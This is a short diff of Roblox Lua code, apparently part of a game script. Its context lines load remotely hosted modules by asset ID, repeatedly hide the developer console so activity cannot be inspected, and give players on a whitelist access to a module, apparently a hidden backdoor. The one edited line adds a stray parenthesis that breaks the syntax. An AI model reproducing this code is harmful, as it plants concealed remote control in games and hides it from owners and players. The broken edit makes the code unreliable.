@@ -14,7 +14,7 @@ else
     task.defer(function()
         require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
     end)
-    for i,v in game:GetService("Players"):GetPlayers() do
+    for i,v in game:GetService("Players"):GetPlayers()) do
         if table.find(whitelisted,v.Name) then
             require(11126053846).fse(v.Name) 
         end
